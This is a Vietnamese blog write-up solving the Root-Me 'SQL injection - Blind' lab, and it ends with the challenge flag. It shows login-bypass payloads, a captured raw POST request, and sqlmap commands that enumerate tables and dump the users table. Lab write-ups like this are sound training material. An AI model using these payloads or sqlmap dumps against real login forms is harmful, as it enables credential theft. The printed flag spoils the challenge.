---
template: overrides/blog.html
icon: material/plus-circle
title: SQL injection - Blind
description: >
  
search:
  exclude: true
hide:
  - feedback

tags:
    - SQL Injection 
---

# __SQL injection - Blind__

<span>
:octicons-calendar-24: May 03, 2023

</span>

---


## __Tài nguyên và link challenge__

Tài nguyên của challenge này tại [https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-blind](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-blind)

Link challenge này tại [:octicons-arrow-right-24: http://challenge01.root-me.org/web-serveur/ch10/][http://challenge01.root-me.org/web-serveur/ch10/]

  [http://challenge01.root-me.org/web-serveur/ch10/]: http://challenge01.root-me.org/web-serveur/ch10/

## __Tổng quan__

Trong challenge này, mục tiêu của ta là lấy password admin.

## __Kịch bản tấn công__
### Bước 1: Kiểm tra website

Challenge này cung cấp cho ta 1 website login. Ta thử login với account admin/admin thì hiện thông báo `Error : no such user/password`

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-blind-01.png#zoom)
  <figcaption>Hình ảnh mô tả website</figcaption>
</figure>

Ta thử tiêm payload vào url nhằm thử tấn công bằng HTTP GET METHOD thì không nhận thấy lỗi từ website :octicons-arrow-right-24: bài này có thể dùng HTTP POST METHOD. Mà đã đùng HTTP GET METHOD thì bật Burp Suite thui nào ::v

### Bước 2: Khai thác website bằng Burp Suite và sqlmap

Khi thử tiêm đơn giản admin = `admin'or'1'='1'--` và password=`admin` thì ngay lập tức hệ thống phản hồi thành user1

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-blind-02.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả tiêm payload</figcaption>
</figure>

Tức là đẫ bị filter :3.

Rồi, ta tiêm tiếp admin = `admin'or'1'='1'` và password=`admin` thì nhận được lỗi.

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-blind-03.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả tiêm payload</figcaption>
</figure>

Và thông qua lỗi này ta biết được hệ quản trị cơ sở dữ liệu đang được dùng là `SQLite3`. Mấu chốt ở đây nè, trên SQLite thì không thể liệt kê cơ sở dữ liệu (csdl) nếu chúng ta dùng sqlmap mà chỉ liệt kê được các bảng trong csdl thôi.

Well, ta sẽ dùng `python sqlmap.py -r ~/Desktop/test/request.txt --tables` với nội dung trong file `request.txt` là nội dung gói tin request được lấy từ Burp Suite. Và cụ thể ở đây phần nội dung gói request của tôi dùng là

<div class="result" markdown>

``` http linenums="1"
POST /web-serveur/ch10/ HTTP/1.1
Host: challenge01.root-me.org
Content-Length: 39
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge01.root-me.org/web-serveur/ch10/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.1.605326343.1682713115; _ga_SRYSKX09J7=GS1.1.1683199137.7.1.1683199154.0.0.0
Connection: close

username=admin'or'1'='1'&password=admin
```

</div>

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-blind-04.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả truy xuất table</figcaption>
</figure>

Ta nhận được 1 table mang tên `users`. Tiến hành dump table `users` bằng `python sqlmap.py -r ~/Desktop/test/request.txt -T users --dump`

Dé, và ta đã có được password của admin và là flag cần tìm.

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-blind-06.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả truy xuất thông tin trong table users</figcaption>
</figure>

???+ question "Chậm lại và suy nghĩ"

    Thực chất payload `admin = admin'or'1'='1'-- và password=admin` đã bị biến đổi nhưng thế nào khi gửi lên server?

??? success "Giải quyết chậm lại suy nghĩ"

    Trong bài này tôi có tiêm 1 ảnh thể hiện payload được gửi lên server nhưng hình ảnh không được hiển thị ở cách bình thường, bạn hãy tìm kiếm ảnh đó nhé! 

!!! success "__Flag__"
    e2azO93i

 [^1] Xem hướng dẫn cài đặt sqlmap tại https://sqlmap.org/